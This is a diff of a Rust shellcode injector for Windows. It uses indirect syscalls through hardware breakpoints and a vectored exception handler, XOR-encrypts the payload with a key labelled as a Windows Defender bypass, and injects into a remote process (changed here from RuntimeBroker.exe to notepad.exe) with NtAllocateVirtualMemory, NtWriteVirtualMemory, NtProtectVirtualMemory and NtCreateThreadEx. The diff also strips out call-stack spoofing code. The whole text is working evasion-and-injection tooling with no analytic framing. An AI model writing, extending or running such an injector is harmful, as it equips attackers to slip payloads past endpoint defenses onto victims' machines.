@@ -14,80 +14,21 @@ use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PA
 use windows::Win32::System::Threading::{
     GetCurrentThread, OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_CREATE_THREAD,
 };
+use windows::Win32::System::Diagnostics::Debug::{
+    AddVectoredExceptionHandler, CONTEXT, EXCEPTION_POINTERS, CONTEXT_FLAGS,
+};
 use windows::Win32::System::ProcessStatus::{EnumProcesses, GetModuleBaseNameA};
 
-// --- Custom Definitions for Indirect Syscalls and HWBP support ---
-
-#[repr(C, align(16))]
-pub struct CONTEXT {
-    pub P1Home: u64,
-    pub P2Home: u64,
-    pub P3Home: u64,
-    pub P4Home: u64,
-    pub P5Home: u64,
-    pub P6Home: u64,
-    pub ContextFlags: u32,
-    pub MxCsr: u32,
-    pub SegCs: u16,
-    pub SegDs: u16,
-    pub SegEs: u16,
-    pub SegFs: u16,
-    pub SegGs: u16,
-    pub SegSs: u16,
-    pub EFlags: u32,
-    pub Dr0: u64,
-    pub Dr1: u64,
-    pub Dr2: u64,
-    pub Dr3: u64,
-    pub Dr6: u64,
-    pub Dr7: u64,
-    pub Rax: u64,
-    pub Rcx: u64,
-    pub Rdx: u64,
-    pub Rbx: u64,
-    pub Rsp: u64,
-    pub Rbp: u64,
-    pub Rsi: u64,
-    pub Rdi: u64,
-    pub R8: u64,
-    pub R9: u64,
-    pub R10: u64,
-    pub R11: u64,
-    pub R12: u64,
-    pub R13: u64,
-    pub R14: u64,
-    pub R15: u64,
-    pub Rip: u64,
-}
-
-#[repr(C)]
-pub struct EXCEPTION_RECORD {
-    pub ExceptionCode: NTSTATUS,
-    pub ExceptionFlags: u32,
-    pub ExceptionRecord: *mut EXCEPTION_RECORD,
-    pub ExceptionAddress: *mut c_void,
-    pub NumberParameters: u32,
-    pub ExceptionInformation: [usize; 15],
-}
-
-#[repr(C)]
-pub struct EXCEPTION_POINTERS {
-    pub ExceptionRecord: *mut EXCEPTION_RECORD,
-    pub ContextRecord: *mut CONTEXT,
-}
-
+// --- Definitions for missing constants ---
 const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
 const EXCEPTION_CONTINUE_SEARCH: i32 = 0;
 const EXCEPTION_SINGLE_STEP: u32 = 0x80000004;
 const CONTEXT_DEBUG_REGISTERS: u32 = 0x00100000 | 0x00000010;
 
 extern "system" {
-    fn AddVectoredExceptionHandler(FirstHandler: u32, VectoredHandler: Option<unsafe extern "system" fn(*mut EXCEPTION_POINTERS) -> i32>) -> *mut c_void;
     fn GetThreadContext(hThread: HANDLE, lpContext: *mut CONTEXT) -> i32;
     fn SetThreadContext(hThread: HANDLE, lpContext: *const CONTEXT) -> i32;
 }
-
-// ----------------------------------------------------------------------------
 
 type NtAllocateVirtualMemory = unsafe extern "system" fn(
     ProcessHandle: HANDLE,
@@ -131,7 +72,6 @@ type NtCreateThreadEx = unsafe extern "system" fn(
 lazy_static! {
     static ref SYSCALL_MAP: Mutex<std::collections::HashMap<usize, u32>> = Mutex::new(std::collections::HashMap::new());
     static ref SYSCALL_RET_ADDR: Mutex<usize> = Mutex::new(0);
-    static ref SPOOF_RETURN_ADDR: Mutex<usize> = Mutex::new(0);
 }
 
 unsafe extern "system" fn veh_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
@@ -146,14 +86,6 @@ unsafe extern "system" fn veh_handler(exception_info: *mut EXCEPTION_POINTERS) -
                 if let Ok(ret_addr) = SYSCALL_RET_ADDR.lock() {
                     (*context).Rip = *ret_addr as u64;
                 }
-
-                if let Ok(spoof_addr) = SPOOF_RETURN_ADDR.lock() {
-                    if *spoof_addr != 0 {
-                        (*context).Rsp -= 8;
-                        *((*context).Rsp as *mut usize) = *spoof_addr;
-                    }
-                }
-
                 (*context).Dr6 = 0;
                 return EXCEPTION_CONTINUE_EXECUTION;
             }
@@ -177,16 +109,6 @@ fn find_syscall_ret() -> Option<usize> {
         }
     }
     None
-}
-
-fn find_spoof_gadget() -> Option<usize> {
-    unsafe {
-        let kernel32_name = "kernel32.dll\0";
-        let kernel32 = GetModuleHandleA(PCSTR(kernel32_name.as_ptr())).ok()?;
-        let alloc_name = "VirtualAlloc\0";
-        let addr = GetProcAddress(kernel32, PCSTR(alloc_name.as_ptr()))?;
-        Some(addr as usize + 0x15)
-    }
 }
 
 fn get_ssn(function_name: &str) -> Option<(usize, u32)> {
@@ -226,8 +148,8 @@ fn xor_payload(data: &mut [u8], key: &[u8]) {
 }
 
 unsafe fn set_hwbp(address: usize, index: usize) -> Result<(), String> {
-    let mut context: CONTEXT = std::mem::zeroed();
-    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    let mut context = CONTEXT::default();
+    context.ContextFlags = CONTEXT_FLAGS(CONTEXT_DEBUG_REGISTERS);
     let thread = GetCurrentThread();
     if GetThreadContext(thread, &mut context) == 0 {
         return Err("Failed to get thread context".to_string());
@@ -292,9 +214,7 @@ fn main() {
         }
     };
 
-    // --- Basic Memory Obfuscation ---
     let key = b"W1ND0W5_D3F3ND3R_BYP455_2026";
-    println!("Encrypting shellcode in memory...");
     xor_payload(&mut shellcode, key);
 
     unsafe {
@@ -303,14 +223,9 @@ fn main() {
             if let Ok(mut ret_addr) = SYSCALL_RET_ADDR.lock() {
                 *ret_addr = addr;
             }
-            println!("Found Indirect Syscall gadget at 0x{:x}", addr);
-        }
-
-        if let Some(addr) = find_spoof_gadget() {
-            if let Ok(mut spoof) = SPOOF_RETURN_ADDR.lock() {
-                *spoof = addr;
-            }
-            println!("Found Call Stack Spoofing gadget at 0x{:x}", addr);
+        } else {
+            eprintln!("Failed to find syscall gadget.");
+            return;
         }
     }
 
@@ -332,12 +247,13 @@ fn main() {
             unsafe {
                 let _ = set_hwbp(addr, i);
             }
-            println!("{}: 0x{:04x} Indirect Syscall + Spoofing at 0x{:x}", func, ssn, addr);
+            println!("{}: 0x{:04x} Indirect Syscall HWBP at 0x{:x}", func, ssn, addr);
         }
     }
 
-    if let Some(pid) = get_process_id_by_name("RuntimeBroker.exe") {
-        println!("Found RuntimeBroker.exe with PID: {}", pid);
+    let target_process = "notepad.exe";
+    if let Some(pid) = get_process_id_by_name(target_process) {
+        println!("Found {} with PID: {}", target_process, pid);
         unsafe {
             let h_process = match OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, false, pid) {
                 Ok(h) => h,
@@ -355,24 +271,28 @@ fn main() {
             let mut base_address: *mut c_void = null_mut();
             let mut region_size = shellcode.len();
 
-            let _ = nt_allocate_virtual_memory(h_process, &mut base_address, 0, &mut region_size, (MEM_COMMIT.0 | MEM_RESERVE.0) as u32, PAGE_READWRITE.0);
+            println!("Allocating memory...");
+            let status = nt_allocate_virtual_memory(h_process, &mut base_address, 0, &mut region_size, (MEM_COMMIT.0 | MEM_RESERVE.0) as u32, PAGE_READWRITE.0);
+            println!("NtAllocateVirtualMemory status: 0x{:x}, Address: {:p}", status.0, base_address);
 
-            // Decrypt just before writing
-            println!("Decrypting shellcode for injection...");
-            xor_payload(&mut shellcode, key);
+            if status.0 == 0 {
+                xor_payload(&mut shellcode, key);
+                let mut bytes_written = 0;
+                let status = nt_write_virtual_memory(h_process, base_address, shellcode.as_ptr() as *const c_void, shellcode.len(), &mut bytes_written);
+                println!("NtWriteVirtualMemory status: 0x{:x}, Bytes: {}", status.0, bytes_written);
 
-            let mut bytes_written = 0;
-            let _ = nt_write_virtual_memory(h_process, base_address, shellcode.as_ptr() as *const c_void, shellcode.len(), &mut bytes_written);
-            let mut old_protect = 0;
-            let _ = nt_protect_virtual_memory(h_process, &mut base_address, &mut region_size, PAGE_EXECUTE_READ.0, &mut old_protect);
+                let mut old_protect = 0;
+                let status = nt_protect_virtual_memory(h_process, &mut base_address, &mut region_size, PAGE_EXECUTE_READ.0, &mut old_protect);
+                println!("NtProtectVirtualMemory status: 0x{:x}", status.0);
 
-            let mut h_thread = HANDLE(0);
-            let _ = nt_create_thread_ex(&mut h_thread, 0x1FFFFF, null_mut(), h_process, base_address, null_mut(), 0, 0, 0, 0, null_mut());
+                let mut h_thread = HANDLE(0);
+                let status = nt_create_thread_ex(&mut h_thread, 0x1FFFFF, null_mut(), h_process, base_address, null_mut(), 0, 0, 0, 0, null_mut());
+                println!("NtCreateThreadEx status: 0x{:x}, Thread Handle: 0x{:x}", status.0, h_thread.0);
+            }
 
-            println!("Shellcode injected and executed with all advanced 2026 techniques.");
             let _ = CloseHandle(h_process);
         }
     } else {
-        println!("RuntimeBroker.exe not found.");
+        println!("{} not found.", target_process);
     }
 }
